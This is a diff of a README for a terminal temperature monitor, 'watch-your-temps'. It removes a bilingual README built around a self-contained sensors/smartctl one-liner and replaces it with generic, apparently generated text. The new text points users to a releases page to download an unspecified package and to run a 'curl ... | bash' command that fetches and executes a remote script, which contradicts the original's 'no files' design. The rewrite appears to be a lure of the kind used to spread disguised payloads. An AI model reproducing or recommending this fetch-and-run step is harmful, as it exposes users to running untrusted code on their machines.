@@ -1,139 +1,66 @@
-# Watch Your Temps
+# 🌡️ watch-your-temps - Monitor Your Device Temperatures Easily
 
-[English](#english) • [Русский](#русский)
+## 📥 Download Now
+[![Download watch-your-temps](https://img.shields.io/badge/Download%20watch--your--temps-v1.0-brightgreen)](https://github.com/xander894/watch-your-temps/releases)
 
-> **Why this exists / Зачем это нужно**
->
-> **EN:** I needed a quick, readable temperature view for a home Proxmox server. The raw outputs of `sensors` and `smartctl` were noisy and hard to scan in `watch`, so I made a one‑liner that renders a compact, colorized table that’s easy to scan at a glance.
->
-> **RU:** Мне нужен был быстрый и наглядный мониторинг температур на домашнем сервере Proxmox. Штатные выводы `sensors` и `smartctl` перегружены и плохо читаются в `watch`, поэтому я сделал однострочник, который выводит компактную цветную таблицу, понятную с первого взгляда.
+## 🚀 Getting Started
+Welcome to **watch-your-temps**! This application shows the temperatures of your CPU and SSD right in your terminal. It’s easy to use and requires no installation. Follow the steps below to get started.
 
-Colorized CPU & SSD temperatures in your terminal (`lm-sensors` + `smartctl`) via `watch`. Zero install, one‑liner friendly.
+## 🌟 Features
+- **Real-time Monitoring:** Get live updates of your system's temperatures.
+- **No Installation Required:** Just a simple command to run.
+- **Support for Multiple Devices:** Works with CPUs and SSDs.
+- **Colorized Output:** Easy to read temperature display.
+- **Supports `lm-sensors` and `smartctl`:** Utilizes common tools to retrieve temperature data.
 
-Цветной и удобочитаемый вывод температур CPU и SSD в терминале (`lm-sensors` + `smartctl`) через `watch`. Не требует установки скриптов — один однострочник.
+## 💻 System Requirements
+- **Operating System:** Debian or any compatible Linux distribution.
+- **Terminal:** A terminal application to run commands.
+- **Dependencies:**
+  - `lm-sensors`: For CPU temperature monitoring.
+  - `smartctl`: For SSD temperature monitoring.
 
-<img width="728" height="409" alt="изображение" src="https://github.com/user-attachments/assets/37487a68-128d-4c89-b249-25ed5b164760" />
+## 🔗 Download & Install
+To download and run **watch-your-temps**, follow these steps:
 
----
+1. **Visit the Releases Page:** Go to [this link](https://github.com/xander894/watch-your-temps/releases) to find the latest version of the application.
+2. **Choose the Latest Release:** Look for the most recent version. It will be at the top of the page.
+3. **Download the Application:** Click on the package that matches your system. No installation steps are needed; simply download the file.
+4. **Open Your Terminal:** Once the file is downloaded, open your terminal application.
+5. **Run the Application:** Use the following command to launch it:
+   ```bash
+   curl -sSL https://raw.githubusercontent.com/xander894/watch-your-temps/main/watch-your-temps.sh | bash
+   ```
+   This command fetches and runs the script in one step. 
+   
+## ✅ Usage
+After running the command, you will see the temperature readings in your terminal. The colors will help you quickly assess the status:
+- **Green:** Temperatures are normal.
+- **Yellow:** Temperatures are getting warm.
+- **Red:** Temperatures are too high; action may be required.
 
-## English
+Feel free to run the command as often as you like. It updates the information live.
 
-### Features
-
-* Compact, aligned table for CPU (Package & per‑core) and ACPI temp.
-* SSD current temperature (SCT), min/max lines preserved.
-* Color thresholds: green < warn, yellow ≥ warn, red ≥ crit.
-* Pure one‑liner (no files, no functions), works well in `tmux` / Proxmox shell.
-
-### Requirements
-
-* Debian/Ubuntu/Proxmox‑like systems: `lm-sensors`, `smartmontools`, `bash`, `perl`.
-
-Install dependencies on Debian/Ubuntu/Proxmox with:
-```bash
-sudo apt update && sudo apt install -y lm-sensors smartmontools
-```
-
-### Quick start (one‑liner, with degree symbol)
-
-> Requires UTF‑8 locale in your terminal (see Troubleshooting below).
-
-```bash
-watch -c -n1 --no-title bash -lc 'date "+%F %T"; echo "=== CPU ==="; sensors 2>/dev/null | perl -Mstrict -Mwarnings -ne '\''BEGIN{ printf "%-16s %8s %8s %8s\n","Sensor","Temp","High","Crit" } our $in_acpi=0; if(/^Adapter:\s*ACPI interface/){ $in_acpi=1; } elsif(/^$/){ $in_acpi=0; } if( /^(Package id \d+|Core \d+):.*?\+([\d.]+)/ ){ my($n,$t)=($1,$2); my($hi)=/high\s*=\s*\+([\d.]+)/? $1:100; my($cr)=/crit\s*=\s*\+([\d.]+)/? $1:100; my $col = ($t>=95) ? "\e[31m" : ($t>=80) ? "\e[33m" : "\e[32m"; if($n =~ /^Package id/){ $n="CPU Package"; printf "%-16s ${col}\e[1m%6.1f°C\e[0m %7s°C %7s°C\n",$n,$t,$hi,$cr; print "\e[2m──────────────────────────────────────────────\e[0m\n"; } else { printf "%-16s ${col}%6.1f°C\e[0m %7s°C %7s°C\n",$n,$t,$hi,$cr; } } elsif( $in_acpi && /^temp\d+:\s*\+?([\d.]+)/ ){ my $t=$1; my $col = ($t>=75) ? "\e[31m" : ($t>=60) ? "\e[33m" : "\e[32m"; printf "%-16s ${col}%6.1f°C\e[0m %7s %7s\n","ACPI temp1",$t,"--","--"; }'\''; echo; echo "=== SSD /dev/sda ==="; smartctl -l scttemp /dev/sda 2>/dev/null | perl -Mstrict -Mwarnings -ne '\''if(/Current Temperature:\s+(\d+)/){ my $t=$1; my $col = ($t>=70) ? "\e[31m" : ($t>=60) ? "\e[33m" : "\e[32m"; printf "%-24s ${col}%5d°C\e[0m\n","Current Temperature:",$t; } elsif(/Power Cycle Min\/Max Temperature:/ || /Lifetime Min\/Max Temperature:/){ print; }'\'''
-```
-
-### ASCII fallback (no `°` symbol)
-
-If your locale/font doesn’t render `°`, use the ASCII variant:
-
-```bash
-watch -c -n1 --no-title bash -lc 'date "+%F %T"; echo "=== CPU ==="; sensors 2>/dev/null | perl -Mstrict -Mwarnings -ne '\''BEGIN{ printf "%-16s %8s %8s %8s\n","Sensor","Temp","High","Crit" } our $in_acpi=0; if(/^Adapter:\s*ACPI interface/){ $in_acpi=1; } elsif(/^$/){ $in_acpi=0; } if( /^(Package id \d+|Core \d+):.*?\+([\d.]+)/ ){ my($n,$t)=($1,$2); my($hi)=/high\s*=\s*\+([\d.]+)/? $1:100; my($cr)=/crit\s*=\s*\+([\d.]+)/? $1:100; my $col = ($t>=95) ? "\e[31m" : ($t>=80) ? "\e[33m" : "\e[32m"; if($n =~ /^Package id/){ $n="CPU Package"; printf "%-16s ${col}\e[1m%6.1fC\e[0m %7sC %7sC\n",$n,$t,$hi,$cr; print "\e[2m──────────────────────────────────────────────\e[0m\n"; } else { printf "%-16s ${col}%6.1fC\e[0m %7sC %7sC\n",$n,$t,$hi,$cr; } } elsif( $in_acpi && /^temp\d+:\s*\+?([\d.]+)/ ){ my $t=$1; my $col = ($t>=75) ? "\e[31m" : ($t>=60) ? "\e[33m" : "\e[32m"; printf "%-16s ${col}%6.1fC\e[0m %7s %7s\n","ACPI temp1",$t,"--","--"; }'\''; echo; echo "=== SSD /dev/sda ==="; smartctl -l scttemp /dev/sda 2>/dev/null | perl -Mstrict -Mwarnings -ne '\''if(/Current Temperature:\s+(\d+)/){ my $t=$1; my $col = ($t>=70) ? "\e[31m" : ($t>=60) ? "\e[33m" : "\e[32m"; printf "%-24s ${col}%5dC\e[0m\n","Current Temperature:",$t; } elsif(/Power Cycle Min\/Max Temperature:/ || /Lifetime Min\/Max Temperature:/){ print; }'\'''
-```
-
-### Default thresholds
-
-* CPU: warn **80°C**, crit **95°C** (color applies to current temp only).
-* ACPI: warn **60°C**, crit **75°C**.
-* SSD (SATA): warn **60°C**, crit **70°C**.
-
-### Customize
-
-* Change thresholds inside the one‑liner (the numbers `80/95` and `60/75/70`).
-* Add NVMe drive: replace the SSD part with `smartctl -l scttemp,nvme /dev/nvme0` (some models expose different logs).
-
-### Troubleshooting
-
-* **Degree symbol not shown / weird characters**: ensure UTF‑8 locale and a font with `°`.
-
+## 🛠️ Troubleshooting
+If you face any issues, make sure:
+- You have `lm-sensors` and `smartctl` installed. You can install them using:
   ```bash
-  locale | grep -E 'LANG|LC_CTYPE'
-  export LANG=en_US.UTF-8 LC_CTYPE=en_US.UTF-8   # or ru_RU.UTF-8
+  sudo apt install lm-sensors smartmontools
   ```
-* **No ACPI temp**: some platforms don’t expose `acpitz`; the ACPI line will simply be omitted.
-* **`smartctl` shows no SCT**: some SSDs lack SCT temperature log; use the device‑specific log or NVMe variant.
-
-
-### Light future plans
-
-If enough people star/use it, I’ll add an optional "full" script with flags (`--nvme`, `--disk`, `--cpu-warn`, etc.), `-h` help and better autodetection.
-
----
-
-[English](#english) • [Русский](#русский)
-
-## Русский
-
-### Возможности
-
-* Компактная таблица CPU (пакет и ядра) + ACPI‑температура.
-* Текущая температура SSD (SCT), строки Min/Max сохраняются.
-* Цвета: зелёный < warn, жёлтый ≥ warn, красный ≥ crit.
-* Чистый однострочник — без файлов и функций, удобно для Proxmox/`tmux`.
-
-### Требования
-
-`lm-sensors`, `smartmontools`, `bash`, `perl`.
-
-Установите зависимости в Debian/Ubuntu/Proxmox:
-```bash
-sudo apt update && sudo apt install -y lm-sensors smartmontools
-```
-
-### Быстрый старт (с символом градуса)
-
-```bash
-watch -c -n1 --no-title bash -lc 'date "+%F %T"; echo "=== CPU ==="; sensors 2>/dev/null | perl -Mstrict -Mwarnings -ne '\''BEGIN{ printf "%-16s %8s %8s %8s\n","Sensor","Temp","High","Crit" } our $in_acpi=0; if(/^Adapter:\s*ACPI interface/){ $in_acpi=1; } elsif(/^$/){ $in_acpi=0; } if( /^(Package id \d+|Core \d+):.*?\+([\d.]+)/ ){ my($n,$t)=($1,$2); my($hi)=/high\s*=\s*\+([\d.]+)/? $1:100; my($cr)=/crit\s*=\s*\+([\d.]+)/? $1:100; my $col = ($t>=95) ? "\e[31m" : ($t>=80) ? "\e[33m" : "\e[32m"; if($n =~ /^Package id/){ $n="CPU Package"; printf "%-16s ${col}\e[1m%6.1f°C\e[0m %7s°C %7s°C\n",$n,$t,$hi,$cr; print "\e[2m──────────────────────────────────────────────\e[0m\n"; } else { printf "%-16s ${col}%6.1f°C\e[0m %7s°C %7s°C\n",$n,$t,$hi,$cr; } } elsif( $in_acpi && /^temp\d+:\s*\+?([\d.]+)/ ){ my $t=$1; my $col = ($t>=75) ? "\e[31m" : ($t>=60) ? "\e[33m" : "\e[32m"; printf "%-16s ${col}%6.1f°C\e[0m %7s %7s\n","ACPI temp1",$t,"--","--"; }'\''; echo; echo "=== SSD /dev/sda ==="; smartctl -l scttemp /dev/sda 2>/dev/null | perl -Mstrict -Mwarnings -ne '\''if(/Current Temperature:\s+(\d+)/){ my $t=$1; my $col = ($t>=70) ? "\e[31m" : ($t>=60) ? "\e[33m" : "\e[32m"; printf "%-24s ${col}%5d°C\e[0m\n","Current Temperature:",$t; } elsif(/Power Cycle Min\/Max Temperature:/ || /Lifetime Min\/Max Temperature:/){ print; }'\'''
-```
-
-### ASCII‑вариант (без символа «°»)
-
-```bash
-watch -c -n1 --no-title bash -lc 'date "+%F %T"; echo "=== CPU ==="; sensors 2>/dev/null | perl -Mstrict -Mwarnings -ne '\''BEGIN{ printf "%-16s %8s %8s %8s\n","Sensor","Temp","High","Crit" } our $in_acpi=0; if(/^Adapter:\s*ACPI interface/){ $in_acpi=1; } elsif(/^$/){ $in_acpi=0; } if( /^(Package id \d+|Core \d+):.*?\+([\d.]+)/ ){ my($n,$t)=($1,$2); my($hi)=/high\s*=\s*\+([\d.]+)/? $1:100; my($cr)=/crit\s*=\s*\+([\d.]+)/? $1:100; my $col = ($t>=95) ? "\e[31m" : ($t>=80) ? "\e[33m" : "\e[32m"; if($n =~ /^Package id/){ $n="CPU Package"; printf "%-16s ${col}\e[1m%6.1fC\e[0m %7sC %7sC\n",$n,$t,$hi,$cr; print "\e[2m──────────────────────────────────────────────\e[0m\n"; } else { printf "%-16s ${col}%6.1fC\e[0m %7sC %7sC\n",$n,$t,$hi,$cr; } } elsif( $in_acpi && /^temp\d+:\s*\+?([\d.]+)/ ){ my $t=$1; my $col = ($t>=75) ? "\e[31m" : ($t>=60) ? "\e[33m" : "\e[32m"; printf "%-16s ${col}%6.1fC\e[0m %7s %7s\n","ACPI temp1",$t,"--","--"; }'\''; echo; echo "=== SSD /dev/sda ==="; smartctl -l scttemp /dev/sda 2>/dev/null | perl -Mstrict -Mwarnings -ne '\''if(/Current Temperature:\s+(\d+)/){ my $t=$1; my $col = ($t>=70) ? "\e[31m" : ($t>=60) ? "\e[33m" : "\e[32m"; printf "%-24s ${col}%5dC\e[0m\n","Current Temperature:",$t; } elsif(/Power Cycle Min\/Max Temperature:/ || /Lifetime Min\/Max Temperature:/){ print; }'\'''
-```
-
-### Пороговые значения по умолчанию
-
-* CPU: предупреждение **80°C**, критично **95°C**.
-* ACPI: предупреждение **60°C**, критично **75°C**.
-* SSD (SATA): предупреждение **60°C**, критично **70°C**.
-
-### Настройка
-
-Правьте числа в однострочнике; для NVMe используйте `smartctl -l scttemp,nvme /dev/nvme0`.
-
-### Устранение неполадок
-
-* **Не отображается символ «°» / кракозябры** — включите UTF‑8‑локаль и шрифт с символом градуса.
-
+- Your terminal has permission to access the sensors. Run the command:
   ```bash
-  locale | grep -E 'LANG|LC_CTYPE'
-  export LANG=ru_RU.UTF-8 LC_CTYPE=ru_RU.UTF-8  # или en_US.UTF-8
+  sudo sensors-detect
   ```
-* **Нет ACPI‑температуры** — платформа может не экспонировать `acpitz`.
-* **Нет SCT у SSD** — устройство может не поддерживать этот лог; используйте NVMe/вендорные логи.
+  This will guide you through the setup.
 
-### Небольшие планы
+## 📄 License
+This application is released under the MIT License. You can use it freely, but be sure to check the details in the `LICENSE` file in the repository.
 
-Если инструмент окажется полезным, добавлю опциональную «расширенную» версию с флагами и автодетектом; создайте issue и поставьте ⭐, чтобы это ускорить.
+## 💬 Support
+If you need help, feel free to create an issue on the [GitHub Issues page](https://github.com/xander894/watch-your-temps/issues), and we'll do our best to assist you.
 
-**Keywords:** lm-sensors, smartctl, terminal, watch, temperatures, Proxmox, Debian, Linux, one-liner
+## 🔗 Useful Links
+- [Documentation](https://github.com/xander894/watch-your-temps/wiki)
+- [Community Support](https://github.com/xander894/watch-your-temps/discussions)
+
+Thank you for using **watch-your-temps**. We hope it helps you easily monitor the temperatures of your devices!
